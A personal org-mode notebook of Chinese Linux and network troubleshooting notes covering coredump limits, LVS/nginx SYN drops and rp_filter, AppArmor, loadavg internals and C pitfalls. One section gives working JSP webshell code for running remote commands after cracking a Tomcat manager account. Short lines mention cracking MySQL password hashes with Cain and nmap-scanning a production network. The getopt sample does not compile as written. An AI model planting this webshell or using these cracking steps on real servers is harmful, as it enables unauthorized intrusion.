@@ -1,0 +1,3141 @@
+#+OPTIONS: "\n:t"
+
+[[file:record_syncookie.org][* syncookie问题]]
+* 获取token
+* coredump被截断
+  一个同事找我，看
+  #gdb -c xxx.core
+  显示
+  BFD: Warning: /home/corefile/core.aaaservice.8689.1374747488 is truncated: expected core file size >= 6965805056, found: 1092853760.
+  coredump文件被截断了。
+#+begin_example
+  aaa-a:/home/corefile # ulimit -a
+  core file size          (blocks, -c) unlimited
+  data seg size           (kbytes, -d) unlimited
+  scheduling priority             (-e) 0
+  file size               (blocks, -f) unlimited
+  pending signals                 (-i) 63812
+  max locked memory       (kbytes, -l) 64
+  max memory size         (kbytes, -m) 6952488
+  open files                      (-n) 1024
+  pipe size            (512 bytes, -p) 8
+  POSIX message queues     (bytes, -q) 819200
+  real-time priority              (-r) 0
+  stack size              (kbytes, -s) 8192
+  cpu time               (seconds, -t) unlimited
+  max user processes              (-u) 63812
+  virtual memory          (kbytes, -v) 13258640
+  file locks                      (-x) unlimited
+#+end_example
+  挺奇怪
+  有看了/etc/security/limits.conf:
+#+begin_example
+        #-----------------------------------------------------------------
+        # the following item is specially used by hitv  system
+        # added by hitv_system_env_init.sh
+        # date : Fri Mar 30 06:05:35 GMT 2012
+        #-----------------------------------------------------------------
+  @hitv    soft    stack    4096
+  @hitv    hard    stack    4096
+  @hitv    soft    nofile    10240
+  @hitv    hard    nofile    65536
+
+  * soft core unlimited
+  * hard core unlimited
+#+end_example
+最后一行我加的。
+但是，core了以后，还是被截断。
+
+后来才发现他是以hitv用户运行的程序，
+而该用户的core大小是受限的。
+
+可以通过这个查看某个进程的limits
+cat /proc/${pid}/limits
+* LVS和nginx引发的问题
+  有人反映aaa/sigon请求超时。
+  我写的小程序请求几个相关的URL，有几分之几的失败率。
+  而另外/cam/user/getxxxx这个URL也超时。
+  我猜测可能其他的URL也存在问题，不单是反映的aaa/sigon请求慢。
+  于是在请求的URL后加上"&myseq=1"
+  其中myseq的序号不停增加。
+  看aaaservice日志和access.log日志
+  发现access.log日志中收到的myseq序号有丢失的情况，
+  而从nginx到aaaservice，没有丢包。
+  
+  nginx共有三台：nginx-a、ngnix-b、nginx-c
+  其中nginx-c中 我发的特殊请求这种格式"myseq=", 一个都没有收到。
+  
+
+  怀疑是lvs的问题，又担心是测试机器到nginx之间网络问题，不确定。
+  后来通过ipvsadmin -ln
+  看
+        ActiveConn  InactiveConn
+  131    75          1000 
+  141    945         1234
+  145    879         1334
+
+  ngnix-c上负载严重不均衡。
+  
+
+  想排除网络。
+  于是在生产环境的局域网中一台机器中
+  请求这URL: http://132.103.18.129:8080/cam/user/getxxxx?xxxx
+  发现还是经常无影响。
+
+  后来我想进一步确实问题，跟nginx转发无法，也就是与aaa无关。
+  请求这个URL: http://132.103.18.129:8080/none
+  故意让ngnix直接返回404，不启动转发功能，不与upstream server交互。
+  发现还是经常连接不上。
+  
+  后来我想直接连接ngnix-a的ip
+  http://132.103.18.141:8080/none
+  很快响应。
+  其他两台ngnix也同样测试了，没有问题。
+
+  现在问题与LVS关系比较大了。
+
+  但是没有直接证据，证明问题。
+  Tony提议，抓包，
+  在一台机器D上运行lwp-request -m GET http://132.103.18.129:8080/none
+  
+  在lvs上运行tcpdump -i eth0 tcp and \( src hostD-ip or dst hostD-ip \)
+  抓数据。发现出问题时，确实有不断想机器D的syn请求重传。
+
+  在ngnix-c上tcpdump -i tunl0 src hostD-ip
+           tcpdump -i eth1 dst hostD-ip
+  发现有收到lvs的syn请求，但是没有回应。
+
+  后来重启了ngnix-c，问题消失。
+
+  tony说可能是rp_filter的问题。
+
+The rp_filter can reject incoming packets if their source address doesn’t match the network interface that they’re arriving on, which helps to prevent IP spoofing. Turning this on, however, has its consequences: If your host has several IP addresses on different interfaces, or if your single interface has multiple IP addresses on it, you’ll find that your kernel may end up rejecting valid traffic. It’s also important to note that even if you do not enable the rp_filter, protection against broadcast spoofing is always on. Also, the protection it provides is only against spoofed internal addresses; external addresses can still be spoofed.. By default, it is disabled. To enable it, run the following:
+
+
+rp_filter - INTEGER
+
+ 0 - No source validation.
+ 1 - Strict mode as defined in RFC3704 Strict Reverse Path
+ Each incoming packet is tested against the FIB and if the interface
+ is not the best reverse path the packet check will fail.
+ By default failed packets are discarded.
+ 2 - Loose mode as defined in RFC3704 Loose Reverse Path
+ Each incoming packet's source address is also tested against the FIB
+ and if the source address is not reachable via any interface
+ the packet check will fail.
+Current recommended practice in RFC3704 is to enable strict mode
+ to prevent IP spoofing from DDos attacks. If using asymmetric routing
+ or other complicated routing, then loose mode is recommended.
+The max value from conf/{all,interface}/rp_filter is used
+ when doing source validation on the {interface}.
+Default value is 0　based our os. Note that some distributions enable it
+ in startup scripts.
+
+
+ 检查流入本机的 IP 地址是否合法，是否从对应接口的路由进来，是否是最佳路由。
+
+设置方法：
+
+系统配置文件
+1. /etc/sysctl.conf
+
+
+把 net.ipv4.conf.all.rp_filter和net.ipv4.conf.default.rp_filter设为0即可
+net.ipv4.conf.default.rp_filter = 0
+net.ipv4.conf.all.rp_filter = 0
+系统启动后，会自动加载这个配置文件，内核会使用这个变量。
+
+2. 命令行
+显示一个内核变量 sysctl net.ipv4.conf.all.rp_filter
+设置一个内核变量 sysctl -w net.ipv4.conf.all.rp_filter=0
+设置完后，会更新内核（实时的内存）中的变量的值，但不会修改sysctl.conf的值
+
+3. 使用/proc文件系统
+查看 cat /proc/sys/net/ipv4/conf/all/rp_filter
+设置 echo "0">/proc/sys/net/ipv4/conf/all/rp_filter
+
+* nmap
+
+使用nmap扫描生产网络。
+
+* tomcat webshell
+  使用建立web工程jsphack，
+  在工程中加入一个cmd.jsp文件
+  在jsphack目录下运行jar cvf *.* jsphack.war
+  
+  破解tomcat管理账户后，可以上传war工程。
+  
+  然后运行cmd.jsp spy.jsp可以运行远程机器上的命令，也可以获取文件。
+
+#+begin_example
+<%@ page contentType="text/html; charset=gb2312"%> 
+<%@page import="java.io.*"%>
+<%@page import="java.util.*"%>
+
+<% 
+String cmd = request.getParameter("cmd"); 
+String output = ""; 
+
+if(cmd != null) { 
+  String s = null; 
+  try { 
+    Process p = Runtime.getRuntime().exec(cmd); 
+    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); 
+    while((s = sI.readLine()) != null) { 
+    output += s+"\n"; 
+    } 
+  } 
+  catch(IOException e) { 
+    e.printStackTrace(); 
+  } 
+}
+output = output.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
+%> 
+<form method="post" action="cmd.jsp"> 
+<input name="cmd" type=text> 
+<input type=submit value="Run"> 
+</form> 
+<textarea name="hack" rows="40" cols="100"> 
+<%=output%> 
+</textarea>
+#+end_example
+    
+* mysql 密码破解
+  mysql 密码信息放在user.MYD文件中。
+  存放的是密码的SHA或者MD5的hashcode
+
+  可以使用工具cain破解。
+
+* 海信社区后台
+http://123.103.18.138:8080/hisadmin/smarttv/login.do
+* rpm segment fault
+  原因是stack 值太少
+  rpm -ivh xxx.rpm
+  segment fault
+
+  linux-edr0:~ # ulimit -a | grep stack
+  stack size              (kbytes, -s) 256
+
+  # ulimit -s 8196
+  然后运行rpm安装程序，正常。
+
+** TODO 怎么能看出问题是由于stack设置过少导致的呢？
+* ngnix TIME_WAIT 过多
+ngx_http_finalize_connection
+* named启动不了
+#+begin_example
+linux-152:~ # service named start
+Starting name server BIND /usr/sbin/named: error while loading shared libraries: libz.so.1: failed to map segment from shared object: Permission denied
+startproc:  exit status of parent of /usr/sbin/named: 127
+                                                                     failed
+linux-152:~ # ltrace
+#+end_example
+在suse上有类似SELinux的机制apparmor
+这个问题看起来像apparmor引起的。
+
+查找libz.so.1，发现/lib目录有一个。
+编辑/etc/apparmor.d/usr.sbin.named:
+加入一行：
+/lib/* rm
+
+然后运行：
+#+begin_example
+linux-152# aa-genprof named
+[(S)can system log for AppArmor events] / (F)inish
+Reading log entries from /var/log/audit/audit.log.
+Updating AppArmor profiles in /etc/apparmor.d.
+Profiling: /usr/sbin/named
+#+end_example
+生成named的新的apparmor配置
+
+然后再次service named start，仍然不行。
+
+使用strace
+#+begin_example
+linux-152# strace named
+...
+open("/usr/local/lib/libz.so.1", O_RDONLY) = 3
+read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@!\0\0\0\0\0\0"..., 832)                                                                                                                            = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=109107, ...}) = 0
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6                                                                                                                           884c48000
+mmap(NULL, 2195952, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = -1 E                                                                                                                           ACCES (Permission denied)
+close(3)                                = 0
+writev(2, [{"named", 5}, {": ", 2}, {"error while loading shared libra"..., 36},
+           {": ", 2}, {"libz.so.1", 9}, {": ", 2}, {"failed to map segment from share"..., 40}, 
+           {": ", 2}, {"Permission denied", 17}, {"\n", 1}], 
+           10named: error while loading shared libraries: libz.so.1: failed to map segment from shared object: Permission denied
+) = 116
+exit_group(127)         
+#+end_example
+可以看到实际使用时/usr/local/lib/libz.so.1不是/lib目录下的。
+再次修改/etc/apparmor.d/usr.sbin.named，再运行aa-genprof named.
+再启动named，成功。
+
+* ifconfig shows dropped rx packets
+
+This document (7007165) is provided subject to the disclaimer at the end of this document. 
+Environment
+ SUSE Linux Enterprise Server 11 Service Pack 2
+Situation
+ ifconfig shows dropped rx packets
+After updating to SLES 11 SP2 packets are being dropped
+Dropped counter incrementing 
+rx_dropped counter is incrementing
+
+Customers have reported seeing dropped packets when examining statistics on their network card, bonds, or virtual interfaces.  
+
+
+Resolution
+ Working as designed.
+Cause
+ Beginning with kernel 2.6.37, it has been changed the meaning of dropped packet count. Before, dropped packets was most likely due to an error. Now, the rx_dropped counter shows statistics for dropped frames because of:
+
+Softnet backlog full
+Bad / Unintended VLAN tags
+Unknown / Unregistered protocols
+IPv6 frames when the server is not configured for IPv6
+
+If any frames meet those conditions, they are dropped before the protocol stack and the rx_dropped counter is incremented.
+Additional Information
+ Care should be taken to confirm that frames are not being legitimately dropped.  A quick way to test this (WARNING: this test does not work for bonding interfaces) is to start a packet capture:
+
+host:~# tcpdump
+
+And then watching the rx_dropped counter.  If it stops incrementing while the tcpdump is running; then it is more than likely showing drops because of the reasons listed earlier.  If frames continue to be dropped while running tcpdump, investigation should take place to determine root cause.
+
+This effect is seen starting from SLES 11 SP2, as it utilizes a 3.x kernel series. Previous SLES versions do not exhibit it (that are using kernels prior to 2.6.37)
+
+Additional information can be found by researching commit # caf586e5
+
+原因：dropped，现在加入了因为：
+Softnet backlog full
+Bad / Unintended VLAN tags
+Unknown / Unregistered protocols
+IPv6 frames when the server is not configured for IPv6
+
+这几个原因，丢包的计数，而之前rx_dropped计数是属于硬件丢包。
+
+运行tcpdump时，所有的包都会被上层接受，所以dropped计数不再增加。
+
+
+运行命令，查看内核注册的支持的protocol
+linux-17:~ # cat /proc/net/ptype
+Type Device      Function
+0800          ip_rcv+0x0/0x2f0
+0011          llc_rcv+0x0/0x350 [llc]
+0004          llc_rcv+0x0/0x350 [llc]
+0806          arp_rcv+0x0/0x140
+dada          edsa_rcv+0x0/0x2b0
+001b          dsa_rcv+0x0/0x290
+001c          trailer_rcv+0x0/0x190
+86dd          ipv6_rcv+0x0/0x3e0 [ipv6_lib]
+
+运行tcpdump 抓包是，
+再次查看
+linux-17:~ # cat /proc/net/ptype
+Type Device      Function
+ALL  eth0     tpacket_rcv+0x0/0x630 [af_packet]
+0800          ip_rcv+0x0/0x2f0
+0806          arp_rcv+0x0/0x140
+dada          edsa_rcv+0x0/0x2b0
+001b          dsa_rcv+0x0/0x290
+001c          trailer_rcv+0x0/0x190
+86dd          ipv6_rcv+0x0/0x3e0 [ipv6_lib]
+
+
+
+现场使用tcpdump抓包，发现是有未注册的protocol
+
+* ifconfig /proc/net/dev
+* sysrq
+  开启sysreq
+ # sysctl -w kernel.sysrq=1 
+ kernel.sysrq = 1 
+ # cat /proc/sys/kernel/sysrq 
+ 1
+
+Alt+SysRq+H 列出帮助
+*
+* sqlite3
+  linux下可以使用命令sqlite3 xxx.db
+  操作数据库文件
+
+* python signal
+  fcntl.fcntl(fd, fcntl.F_SETSIG, 0)
+  flags = fcntl.DN_MODIFY | fcntl.DN_DELETE | fcntl.DN_CREATE | fcntl.DN_MULTISHOT
+  # ctypes.c_int for fcntl.DN_MULTISHOT overflow in some machine
+  fcntl.fcntl(fd, fcntl.F_NOTIFY, ctypes.c_int(flags).value)
+
+  signal.signal(signal.SIGIO, handler)
+
+  def handler(signum, frame):
+      queue.put_nowait(1)
+
+
+  发现handler经常就不起作用，最后发现应该python:Queue的api不是可重入的
+  semphore 也不可重入
+* atoll 返回结果溢出
+  同事写一个程序，简化后如下：
+#+begin_src c
+ #include <stdio.h>
+int main(int argc, char** argv)
+{
+  long long num = 0;
+  num = atoll("100000000000");
+  printf("num=%lld", num);
+  return 0;
+}
+#+end_src
+运行结果num=1215752192 
+
+
+1215752192 = 0x4876E800
+1000000000 = 0x174876E800
+显然atoll返回的结果是32位的。
+这个程序怎么能有问题。
+后来换成strtoll，结果还是一样。
+
+后来我想到突然想到可能是使用atoll()，没用include其头文件，导致c默认使用int作为返回值。
+后来加上#include<stdlib.h>，
+结果就正确了。
+
+我对比了修改前后的编译结果，希望发现差异。
+最后对比发现，出问题是仅多了一条指令ctlq
+
+ # objdump -d main
+00000000040058c <main>:
+  40058c:	55                   	push   %rbp
+  40058d:	48 89 e5             	mov    %rsp,%rbp
+  400590:	48 83 ec 20          	sub    $0x20,%rsp
+  400594:	89 7d ec             	mov    %edi,-0x14(%rbp)
+  400597:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
+  40059b:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
+  4005a2:	00 
+  4005a3:	bf d4 06 40 00       	mov    $0x4006d4,%edi
+  4005a8:	b8 00 00 00 00       	mov    $0x0,%eax
+  4005ad:	e8 d6 fe ff ff       	callq  400488 <atoll@plt>
+  4005b2:	48 98                	cltq   
+  4005b4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+  4005b8:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
+  4005bc:	bf e1 06 40 00       	mov    $0x4006e1,%edi
+  4005c1:	b8 00 00 00 00       	mov    $0x0,%eax
+  4005c6:	e8 9d fe ff ff       	callq  400468 <printf@plt>
+  4005cb:	b8 00 00 00 00       	mov    $0x0,%eax
+  4005d0:	c9                   	leaveq 
+  4005d1:	c3                   	retq   
+
+
+  使用gdb调试，运行ctlq前，rax=0x174876e800,还是正确的，
+  之后就切成32位。
+  # gdb main
+  (gdb) b *0x4005b2
+  Breakpoint 1 at 0x4005b2
+  (gdb) r
+  Breakpoint 1, 0x00000000004005b2 in main ()
+  (gdb) x /i $pc
+  => 0x4005b2 <main+38>:  cltq
+  (gdb) p /x $rax
+  $1 = 0x174876e800
+  (gdb) si
+  0x00000000004005b4 in main ()
+  (gdb) p /x $rax
+  $2 = 0x4876e800
+  (gdb)
+
+
+  cltq指令
+  cltq R[%rax ] <- SignExtend(R[%eax]) Convert %eax to quad word，将$eax转化为4字，不就是RAX了嘛，切，
+  cltq是有符号数的扩展，如果$eax的最高的32位为1的话，RAX的高32扩展后全为1，相反如果$EAX的高位为0的话，则扩展出来后全为0
+* CLOSE_WAIT
+  被动关闭端，收到FIN后，如果不关闭socket，那么将socket永久处于CLOSE_WAIT状态。
+* server 不accept
+  server 监听一个端口（server backlog = 128)
+  client 不断向server建立连接。
+  当建立链接数超过128后，server端ESTAB状态的链接不再增加，而SYN-RECV状态的链接开始增多。
+  此是client端的ESTAB状态一直增加。
+  
+  从实验可以看到，当连接数超过128后，Server仍然向client发送syn/ack，但是syn-recv状态定时器开启，重试发送5次后超时。放弃链接。
+  而client端确对此一无所知，还认为是合法链接。
+  
+* 写mmap内存变慢的原因
+  同事写的程序在线上遇到性能问题，
+  拉了一堆人一起分析原因。最后大家一致认定是由于访问锁把速度拉下慢了。
+  但是通过看代码也没有看到锁用不当的地方。
+  最后人们终于发现是一处代码将一个文件mmap了，再mmap的内存中存放锁！！
+  就是由于访问锁的内存操作慢，所以才导致了整体性能下降。
+  
+  tony将频繁些磁盘的jdb2内核线程停掉，再进行测试，问题就没有了。
+  
+  后来我写了一个测试程序：
+#+begin_src c
+#include <sys/mman.h> /* for mmap and munmap */
+#include <sys/types.h> /* for open */
+#include <sys/stat.h> /* for open */
+#include <fcntl.h>     /* for open */
+#include <unistd.h>    /* for lseek and write */
+#include <stdio.h>
+#include <string.h> /* for memcpy */
+#include <sys/mman.h>
+
+int main(int argc, char **argv)
+
+{
+    int fd;
+    char *mapped_mem, * p;
+    int flength = 1024;
+    void * start_addr = 0;
+    struct timeval tpstart,tpend;
+    double timeuse;
+    int count = 0;
+    int rc;
+    fd = open(argv[1], O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
+    flength = lseek(fd, 1, SEEK_END);
+    write(fd, "\0", 1); /* 在文件最后添加一个空字符，以便下面printf正常工作 */
+    lseek(fd, 0, SEEK_SET);
+    //start_addr = 0x80000;
+    mapped_mem = mmap(NULL, flength, PROT_READ|PROT_WRITE,
+                      MAP_SHARED,
+                      fd, 0);
+    rc = mlock(mapped_mem, flength);
+    printf("mlock ------------------rc=%d\n", rc);
+    madvise(mapped_mem, flength, MADV_WILLNEED);
+    while(1) {
+        char buf[256];
+        printf("------------------------------------------\n");
+        gettimeofday(&tpstart,NULL);
+
+        strcpy(buf, mapped_mem);
+
+        gettimeofday(&tpend,NULL);
+        timeuse=1000000*(tpend.tv_sec-tpstart.tv_sec)+tpend.tv_usec-tpstart.tv_usec;
+        timeuse/=1000000;
+        printf("read processor time is %lf s\n",timeuse);
+
+        printf("%s\n", buf);
+        sprintf(buf,"linux%d", count++);
+
+        gettimeofday(&tpstart,NULL);
+
+        strcpy(mapped_mem, buf);
+
+        gettimeofday(&tpend,NULL);
+        timeuse=1000000*(tpend.tv_sec-tpstart.tv_sec)+tpend.tv_usec-tpstart.tv_usec;
+        timeuse/=1000000;
+        printf("write processor time is %lf s\n",timeuse);
+
+        sleep(1);
+    }
+    close(fd);
+    munmap(mapped_mem, flength);
+    return 0;
+
+}
+
+#+end_src
+
+ 运行: testmap test.txt
+
+ 同时在另一个窗口，运行fsync test.txt
+ 发现每次运行fsync，testmap程序花在写的时间就增加很多。
+ 
+ 我就疑惑为什么，page cache不会怎么快就被换出去啊，但是写时间增加，应该是由于触发page fault。
+ 但是为什么呢？？
+ 这样刷新文件的writeback操作会影响写内存的操作？
+
+ 原来：
+ 在write_cache_pages里，lock_page以后会调用clear_page_dirty_io(page)
+ 然后：
+ --> clear_page_dirty_for_io(page)
+ --> page_mkclean(page)
+ --> page_mkclean_file(page)
+ --> page_mkclean_one(page)
+
+ 而page_mkclean_one(page)，里面会执行pte_wrprotect(entry),
+ 也就是置pte为写保护。
+ 当应用写这个page时，就会碰到写保护，触发do_page_fault,即使这个page已经在内存中了。
+ --> do_page_fault
+ --> handle_mm_fault
+ --> handle_pte_fault
+
+ handle_pte_fault 一段代码：
+   if(flags & FAULT_FLAGS_WRITE) {
+      if(!pte_write(entry))
+          return do_wp_page(mm, vma, address,
+                    pte, pmd, ptl, entry);
+       entry = pte_mkdirty(entry);
+   }
+ 
+而do_wp_page,会对可写且共享的vma里的page，依次调用page_mkwrite。
+
+page_mkwrite会lock_page
+*  ntoa
+写一个程序测试dns
+#+begin_src c
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+
+int main(int argc, char *argv[])
+{
+    struct hostent *h;
+
+    if (argc != 2) {
+        fprintf(stderr,"usage: getip address\n");
+        exit(1);
+    }
+    sethostent(1);
+
+    if ((h=gethostbyname(argv[1])) == NULL) {
+        herror("gethostbyname");
+        exit(1);
+    }
+
+    printf("Host name : %s\n", h->h_name);
+    printf("IP Address : %s\n",inet_ntoa(*((struct in_addr *)h->h_addr)));
+
+    return 0;
+}
+
+#+end_src
+
+最后一个printf总崩掉，原因，inet_ntoa没有引用头文件，返回int型了。而测试的机器是64位的。
+char * 和 int位数不同。
+
+* getopt
+
+#+begin_src c
+     #include <ctype.h>
+     #include <stdio.h>
+     #include <stdlib.h>
+     #include <unistd.h>
+     
+     int
+     main (int argc, char **argv)
+     {
+       int aflag = 0;
+       int bflag = 0;
+       char *cvalue = NULL;
+       int index;
+       int c;
+     
+       opterr = 0;
+     
+       while ((c = getopt (argc, argv, "abc:d::")) != -1)
+         switch (c)
+           {
+           case 'a':
+             aflag = 1;
+             break;
+           case 'b':
+             bflag = 1;
+             break;
+           case 'c':
+             cvalue = optarg;
+             break;
+           case '?':
+             if (optopt == 'c')
+               fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+             else if (isprint (optopt))
+               fprintf (stderr, "Unknown option `-%c'.\n", optopt);
+             else
+               fprintf (stderr,
+                        "Unknown option character `\\x%x'.\n",
+                        optopt);
+             return 1;
+           case 'd':
+             dvalue = optarg;
+
+           default:
+             abort ();
+           }
+     
+       printf ("aflag = %d, bflag = %d, cvalue = %s, dvalue = %s\n",
+               aflag, bflag, cvalue, dvalue);
+     
+       for (index = optind; index < argc; index++)
+         printf ("Non-option argument %s\n", argv[index]);
+       return 0;
+     }
+
+#+end_src
+
+* netstat 原理
+  读取/proc文件系统
+  
+  /proc/net/tcp -- TCP socket information
+
+ tcp4_seq_show() -> get_tcp4_sock()
+关于其中rx_queue的含义：
+#+begin_src c
+	if (sk->sk_state == TCP_LISTEN)
+		rx_queue = sk->sk_ack_backlog;
+	else
+		/*
+		 * because we dont lock socket, we might find a transient negative value
+		 */
+		rx_queue = max_t(int, tp->rcv_nxt - tp->copied_seq, 0);
+#+end_src
+我们可以看出
+对于处于LISTEN状态的的链接，rx_queue是半链接队列的长度。
+处于其他状态的，rx_queue是尚未被用户态处理的数据字节数
+
+  /proc/net/udp -- UDP socket information
+
+* ipvs
+ip_vs_schedule() -> dest = svc->scheduler->schedule(svc, skb);
+->ip_vs_rr_schedule()
+
+	do {
+		/* skip list head */
+		if (q == &svc->destinations) {
+			q = q->next;
+			continue;
+		}
+
+		dest = list_entry(q, struct ip_vs_dest, n_list);
+		if (!(dest->flags & IP_VS_DEST_F_OVERLOAD) &&
+		    atomic_read(&dest->weight) > 0)
+			/* HIT */
+			goto out;
+		q = q->next;
+	} while (q != p);
+
+
+而IP_VS_DEST_F_OVERLOAD，是由下面代码设置的
+ip_vs_bind_dest()
+	if (dest->u_threshold != 0 &&
+	    ip_vs_dest_totalconns(dest) >= dest->u_threshold)
+		dest->flags |= IP_VS_DEST_F_OVERLOAD;
+
+* strncpy strncat snprintf
+char *strncpy(char *dest, const char *src, size_t n);
+最多从src中拷贝n个字符到dest。如果src的大小小于n，那么dest剩下的部分将被填0；
+如果src的大小大于等于n，那么dest剩下的部分不会被填0，于是dest将不会以0结束。
+
+#+begin_src
+           char*
+           strncpy(char *dest, const char *src, size_t n){
+               size_t i;
+
+               for (i = 0 ; i < n && src[i] != '\0' ; i++)
+                   dest[i] = src[i];
+               for ( ; i < n ; i++)
+                   dest[i] = '\0';
+
+               return dest;
+           }
+#+end_src
+char *strncat(char *dest, const char *src, size_t n);
+最多从源中拷贝n个字符到目标串中，并在后面加一个0；也就是说，最多会有n+1个字符被写进dest。如果dest的容量为n，那么将会dest将会溢出。
+
+
+int snprintf(char *str, size_t size, const char *format, ...);
+最多从源串中拷贝size－1个字符到目标串中，然后再在后面加一个0。所以如果目标串的大小为size的话，将不会溢出。
+所以，字符串拷贝，最好用snprintf。
+
+* Loadavg浅述 
+Loadavg浅述 
+http://kernel.taobao.org/index.php/Loadavg%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90
+cat /proc/loadavg可以看到当前系统的load 
+$ cat /proc/loadavg 
+0.01 0.02 0.05 2/317 26207 
+前面三个值分别对应系统当前1分钟、5分钟、15分钟内的平均load。load用于反映当前系统的负载情况
+，对于16核的系统，如果每个核上cpu利用率为30%，则在不存在uninterruptible进程的情况下，系统load应该维持在4.8左右。
+对16核系统，如果load维持在16左右，在不存在uninterrptible进程的情况下，意味着系统CPU几乎不存在空闲状态，利用率接近于100%。
+结合iowait、vmstat和loadavg可以分析出系统当前的整体负载，各部分负载分布情况。 
+
+Loadavg读取 
+
+在内核中/proc/loadavg是通过load_read_proc来读取相应数据，下面首先来看一下load_read_proc的实现： 
+fs/proc/proc_misc.c
+#+begin_src c
+static int loadavg_read_proc(char *page, char **start, off_t off, 
+                                 int count, int *eof, void *data) 
+{ 
+        int a, b, c; 
+        int len; 
+
+        a = avenrun[0] + (FIXED_1/200); 
+        b = avenrun[1] + (FIXED_1/200); 
+        c = avenrun[2] + (FIXED_1/200); 
+        len = sprintf(page,"%d.%02d %d.%02d %d.%02d %ld/%d %d\n", 
+                LOAD_INT(a), LOAD_FRAC(a), 
+                LOAD_INT(b), LOAD_FRAC(b), 
+                LOAD_INT(c), LOAD_FRAC(c), 
+                nr_running(), nr_threads, last_pid); 
+        return proc_calc_metrics(page, start, off, count, eof, len); 
+}
+#+end_src
+
+几个宏定义如下： 
+#+begin_src c
+ #define FSHIFT          11              /* nr of bits of precision */ 
+ #define FIXED_1         (1<<FSHIFT)     /* 1.0 as fixed-point */ 
+ #define LOAD_INT(x) ((x) >> FSHIFT) 
+ #define LOAD_FRAC(x) LOAD_INT(((x) & (FIXED_1-1)) * 100)
+#+end_src
+
+根据输出格式，LOAD_INT对应计算的是load的整数部分，LOAD_FRAC计算的是load的小数部分。 
+将a=avenrun[0] + (FIXED_1/200）带入整数部分和小数部分计算可得： 
+#+begin_example
+LOAD_INT(a) = avenrun[0]/(2^11) + 1/200
+LOAD_FRAC(a) = ((avenrun[0]%(2^11) + 2^11/200) * 100) / (2^11)
+             = (((avenrun[0]%(2^11)) * 100 + 2^10) / (2^11)
+             = ((avenrun[0]%(2^11) * 100) / (2^11) +  
+#+end_example
+
+由上述计算结果可以看出，FIXED_1/200在这里是用于小数部分第三位的四舍五入，由于小数部分只取前两位，第三位如果大于5，则进一位，否则直接舍去。 
+
+临时变量a/b/c的低11位存放的为load的小数部分值，第11位开始的高位存放的为load整数部分。因此可以得到a=load(1min) * 2^11 
+因此有: load(1min) * 2^11 = avenrun[0] + 2^11 / 200 
+进而推导出： load(1min)=avenrun[0]/(2^11) + 1/200 
+忽略用于小数部分第3位四舍五入的1/200，可以得到load(1min)=avenrun[0] / 2^11，即： 
+avenrun[0] = load(1min) * 2^11 
+
+avenrun是个陌生的量，这个变量是如何计算的，和系统运行进程、cpu之间的关系如何，在第二阶段进行分析。 
+
+Loadavg和进程之间的关系 
+
+内核将load的计算和load的查看进行了分离，avenrun就是用于连接load计算和load查看的桥梁。 
+下面开始分析通过avenrun进一步分析系统load的计算。 
+avenrun数组是在calc_load中进行更新 
+kernel/timer.c
+#+begin_src c
+ /* 
+ * calc_load - given tick count, update the avenrun load estimates. 
+ * This is called while holding a write_lock on xtime_lock. 
+ */ 
+static inline void calc_load(unsigned long ticks) 
+{ 
+        unsigned long active_tasks; /* fixed-point */ 
+        static int count = LOAD_FREQ;  
+        count -= ticks; 
+        if (count < 0) { 
+                count += LOAD_FREQ; 
+                active_tasks = count_active_tasks(); 
+                CALC_LOAD(avenrun[0], EXP_1, active_tasks); 
+                CALC_LOAD(avenrun[1], EXP_5, active_tasks); 
+                CALC_LOAD(avenrun[2], EXP_15, active_tasks); 
+        } 
+}
+static unsigned long count_active_tasks(void) 
+{ 
+        return nr_active() * FIXED_1; 
+}
+#+end_src
+ #define LOAD_FREQ       (5*HZ)          /* 5 sec intervals */ 
+ #define EXP_1           1884            /* 1/exp(5sec/1min) as fixed-point */ 
+ #define EXP_5           2014            /* 1/exp(5sec/5min) */ 
+ #define EXP_15          2037            /* 1/exp(5sec/15min) */
+
+
+calc_load在每个tick都会执行一次，每个LOAD_FREQ（5s）周期执行一次avenrun的更新。 
+active_tasks为系统中当前贡献load的task数nr_active乘于FIXED_1，用于计算avenrun。宏CALC_LOAD定义如下： 
+ #define CALC_LOAD(load,exp,n) \ 
+       load *= exp; \ 
+       load += n*(FIXED_1-exp); \ 
+       load >>= FSHIFT;
+
+
+用avenrun(t-1)和avenrun(t)分别表示上一次计算的avenrun和本次计算的avenrun，则根据CALC_LOAD宏可以得到如下计算： 
+avenrun(t)=(avenrun(t-1) * EXP_N + nr_active * FIXED_1*(FIXED_1 – EXP_N)) / FIXED_1
+          = avenrun(t-1) + (nr_active*FIXED_1 – avenrun(t-1)) * (FIXED_1 -EXP_N) / FIXED_1
+
+
+推导出： 
+avenrun(t) – avenrun(t-1) = (nr_active*FIXED_1 – avenrun(t-1)) * (FIXED_1 – EXP_N) / FIXED_1
+
+
+将第一阶段推导的结果代入上式，可得： 
+(load(t) – load(t-1)) * FIXED_1 = (nr_active – load(t-1)) * (FIXED_1 – EXP_N)
+
+
+进一步得到nr_active变化和load变化之间的关系式： 
+
+load(t) – load(t-1) = (nr_active – load(t-1)) * (FIXED_1 – EXP_N) / FIXED_1 
+
+这个式子可以反映的内容包含如下两点： 
+1）当nr_active为常数时，load会不断的趋近于nr_active，趋近速率由快逐渐变缓 
+2）nr_active的变化反映在load的变化上是被降级了的，系统突然间增加10个进程， 
+1分钟load的变化每次只能够有不到1的增加（这个也就是权重的的分配）。 
+
+另外也可以通过将式子简化为： 
+
+load(t)= load(t-1) * EXP_N / FIXED_1 + nr_active * (1 - EXP_N/FIXED_1)  
+
+这样可以更加直观的看出nr_active和历史load在当前load中的权重关系 （多谢任震宇大师的指出） 
